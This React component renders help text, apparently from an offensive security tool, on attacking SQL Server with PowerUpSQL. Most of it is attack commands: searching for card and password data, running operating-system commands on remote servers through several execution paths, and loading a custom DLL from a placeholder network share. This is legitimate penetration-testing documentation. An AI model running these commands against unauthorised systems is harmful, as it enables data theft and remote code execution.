import React from 'react';

const Abuse = () => {
    return (
        <>
            <p>
                Scott Sutherland (
                <a href='https://twitter.com/_nullbind'>@nullbind</a>) from
                NetSPI has authored PowerUpSQL, a PowerShell Toolkit for
                Attacking SQL Server. Major contributors include Antti
                Rantasaari, Eric Gruber (
                <a href='https://twitter.com/egru'>@egru</a>), and Thomas Elling
                (<a href='https://github.com/thomaselling'>@thomaselling</a>).
                Before executing any of the below commands, download PowerUpSQL
                and load it into your PowerShell instance. Get PowerUpSQL here:{' '}
                <a href='https://github.com/NetSPI/PowerUpSQL'>
                    https://github.com/NetSPI/PowerUpSQL
                </a>
                .
            </p>

            <h4>Finding Data</h4>

            <p>Get a list of databases, sizes, and encryption status:</p>
            <pre>
                <code>
                    {
                        'Get-SQLDatabaseThreaded –Verbose -Instance sqlserver\\instance –Threads 10 -NoDefaults'
                    }
                </code>
            </pre>
            <p>Search columns and data for keywords:</p>
            <pre>
                <code>
                    {
                        'Get-SQLColumnSampleDataThreaded –Verbose -Instance sqlserver\\instance –Threads 10 –Keyword "card, password" –SampleSize 2 –ValidateCC -NoDefaults | ft -AutoSize'
                    }
                </code>
            </pre>

            <h4>Executing Commands</h4>

            <p>
                Below are examples of PowerUpSQL functions that can be used to
                execute operating system commands on remote systems through SQL
                Server using different techniques. The level of access on the
                operating system will depend largely what privileges are
                provided to the service account. However, when domain accounts
                are configured to run SQL Server services, it is very common to
                see them configured with local administrator privileges.
            </p>
            <p>xp_cmdshell Execute Example:</p>
            <pre>
                <code>
                    {
                        'Invoke-SQLOSCmd -Verbose -Command "Whoami" -Threads 10 -Instance sqlserver\\instance'
                    }
                </code>
            </pre>
            <p>Agent Job Execution Examples:</p>
            <pre>
                <code>
                    {
                        'Invoke-SQLOSCmdAgentJob -Verbose -SubSystem CmdExec -Command "echo hello > c:\\windows\\temp\\test1.txt" -Instance sqlserver\\instance -username myuser -password mypassword'
                    }
                </code>
            </pre>
            <pre>
                <code>
                    {
                        'Invoke-SQLOSCmdAgentJob -Verbose -SubSystem PowerShell -Command \'write-output "hello world" | out-file c:\\windows\\temp\\test2.txt\' -Sleep 20 -Instance sqlserver\\instance -username myuser -password mypassword'
                    }
                </code>
            </pre>
            <pre>
                <code>
                    {
                        "Invoke-SQLOSCmdAgentJob -Verbose -SubSystem VBScript -Command 'c:\\windows\\system32\\cmd.exe /c echo hello > c:\\windows\\temp\\test3.txt' -Instance sqlserver\\instance -username myuser -password mypassword"
                    }
                </code>
            </pre>
            <pre>
                <code>
                    {
                        "Invoke-SQLOSCmdAgentJob -Verbose -SubSystem JScript -Command 'c:\\windows\\system32\\cmd.exe /c echo hello > c:\\windows\\temp\\test3.txt' -Instance sqlserver\\instance -username myuser -password mypassword"
                    }
                </code>
            </pre>
            <p>Python Subsystem Execution:</p>
            <pre>
                <code>
                    {
                        'Invoke-SQLOSPython -Verbose -Command "Whoami" -Instance sqlserver\\instance'
                    }
                </code>
            </pre>
            <p>R subsystem Execution Example</p>
            <pre>
                <code>
                    {
                        'Invoke-SQLOSR -Verbose -Command "Whoami" -Instance sqlserver\\instance'
                    }
                </code>
            </pre>
            <p>OLE Execution Example</p>
            <pre>
                <code>
                    {
                        'Invoke-SQLOSOle -Verbose -Command "Whoami" -Instance sqlserver\\instance'
                    }
                </code>
            </pre>
            <p>CLR Execution Example</p>
            <code>
                {
                    'Invoke-SQLOSCLR -Verbose -Command "Whoami" -Instance sqlserver\\instance'
                }
            </code>
            <p>Custom Extended Procedure Execution Example:</p>
            <p>1. Create a custom extended stored procedure.</p>
            <pre>
                <code>
                    {
                        'Create-SQLFileXpDll -Verbose -OutFile c:\\temp\\test.dll -Command "echo test > c:\\temp\\test.txt" -ExportName xp_test'
                    }
                </code>
            </pre>
            <p>
                2. Host the test.dll on a share readable by the SQL Server
                service account.
            </p>
            <pre>
                <code>
                    {
                        "Get-SQLQuery -Verbose -Query \"sp_addextendedproc 'xp_test', '\\\\yourserver\\yourshare\\myxp.dll'\" -Instance sqlserver\\instance"
                    }
                </code>
            </pre>
            <p>3. Run extended stored procedure</p>
            <pre><code>{'Get-SQLQuery -Verbose -Query "xp_test" -Instance sqlserver\\instance'}</code></pre>
            <p>4. Remove extended stored procedure.</p>
            <pre><code>{'Get-SQLQuery -Verbose -Query "sp_dropextendedproc \'xp_test\'" -Instance sqlserver\\instance'}</code></pre>
            <p>Author: Scott Sutherland</p>
        </>
    );
};

export default Abuse;
